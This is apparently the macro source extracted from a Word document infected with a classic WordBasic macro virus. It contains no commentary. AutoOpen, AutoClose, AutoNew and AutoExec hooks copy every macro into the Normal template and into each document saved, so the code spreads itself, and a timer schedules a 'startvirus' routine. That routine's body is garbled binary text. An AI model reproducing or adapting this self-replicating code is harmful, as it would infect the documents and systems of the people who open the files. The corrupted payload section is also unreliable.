   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "startvirus"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.gettime.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.startvirus.MAIN"
   Dim TOTAL
   TOTAL = 4
   ReDim M__$(TOTAL)
   M__$(1) = "??!! ?????????? ???????????"                Goto As Goto'ŒŽŽŽ*Žï‡ŠŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽ–ŽÏÎ|q/Ž–Ž‚7ù=Ó"ÿ6&(ü%"ŽŽŽŽŽŽŽŽŽŽŽŽŽŽŽ*ŽŽŽ†ŽŒ*ŽŽ‰Žqqqqqq¤ŽŒŽA7@)~ŽŽ£ŽŒŽc$h †ŽŽŽ£Ž*Žf*õ;/(†ŽŽŽ£Ž©ŽŠûýëü‘Í´ÒÃÝÁèèçí     : Redim        -1

   Attribute VB_Name = "SaveNormal"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.SaveNew.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.SaveNormal.MAIN"
   Dim B$
   Dim nowmacro
   Dim count_
   Dim name_$
   Dim C$
   B$ = WordBasic.[FileName$]()
   nowmacro = WordBasic.CountMacros(1)
   If nowmacro <> 0 Then
       For count_ = 1 To WordBasic.CountMacros(1)
           name_$ = WordBasic.[MacroName$](count_, 1)
           C$ = B$ + ":" + name_$
           WordBasic.MacroCopy C$, name_$, 1
       Next count_
       WordBasic.Call "autosave"
   End If
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.AutoExec.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim Normal
   Dim count_
   Dim name_$
   Normal = 0
   For count_ = 1 To WordBasic.CountMacros(0)
       name_$ = WordBasic.[MacroName$](count_, 0)
       If name_$ = "AutoSave" Then
           Normal = 1
       End If
   Next count_

   If Normal = 1 Then
           WordBasic.Call "SaveNew"
   Else
           WordBasic.Call "SaveNormal"
   End If
   End Sub

   Attribute VB_Name = "AutoSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.AutoOpen.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoSave.MAIN"
   Dim name_$
   Dim sear$
   name_$ = WordBasic.[FileName$]()
   sear$ = WordBasic.[Right$](name_$, 4)
   If InStr(sear$, ".") = 0 Then
     name_$ = name_$ + ".DOC"
   End If
   WordBasic.FileSaveAs Name:=name_$, Format:=1

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.Call "AutoClose"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.Call "gettime"
   End Sub

   Attribute VB_Name = "SaveNew"

   Public Sub MAIN()
   Dim B$
   Dim nowmacro
   Dim count_
   Dim name_$
   Dim C$
   B$ = WordBasic.[FileName$]()
   nowmacro = WordBasic.CountMacros(1)
   If nowmacro = 0 Then
       For count_ = 1 To WordBasic.CountMacros(0)
           name_$ = WordBasic.[MacroName$](count_, 0)
           C$ = B$ + ":" + name_$
           WordBasic.MacroCopy name_$, C$, 1
       Next count_
       WordBasic.Call "autosave"
   End If
   End Sub

   Attribute VB_Name = "gettime"

   Public Sub MAIN()
   Dim nowhour$
   Dim tHour
   Dim nowmin$
   Dim NIGHT$
   Dim tmin
   Dim nowtime$
   nowhour$ = WordBasic.[Left$](WordBasic.[Time$](), 2)
   tHour = WordBasic.Val(nowhour$)
   nowmin$ = Mid(WordBasic.[Time$](), 4, 2)
   NIGHT$ = WordBasic.[RTrim$](WordBasic.[LTrim$](UCase(WordBasic.[Right$](WordBasic.[Time$](), 2))))
   tmin = WordBasic.Val(nowmin$)
   If NIGHT$ = "PM" Then
     tHour = tHour + 12
   End If

   tHour = tHour + 1

   If tHour > 23 Then
     tHour = 24 - tHour
   End If

   nowhour$ = WordBasic.[RTrim$](WordBasic.[LTrim$](Str(tHour)))
   nowmin$ = WordBasic.[RTrim$](WordBasic.[LTrim$](Str(tmin)))
   nowhour$ = String(2 - Len(nowhour$), "0") + nowhour$
   nowmin$ = String(2 - Len(nowmin$), "0") + nowmin$
   nowtime$ = nowhour$ + ":" + nowmin$
   WordBasic.OnTime nowtime$, "startvirus", 1
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Û¦Ê°Ò±Ê°ó©Ø«ß¥s·ÉÀ"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
   WordBasic.Call "AutoClose"
   End Sub

   Attribute VB_Name = "Visio"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TemplateProject.startvirus.MAIN"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Visio.MAIN"
   If WordBasic.CountWindows() > 0 And Not (WordBasic.IsMacro(WordBasic.Window())) Then
           WordBasic.InsertObject Class:="Visio.Drawing.4"
       Else
           WordBasic.Beep
       End If
   End Sub
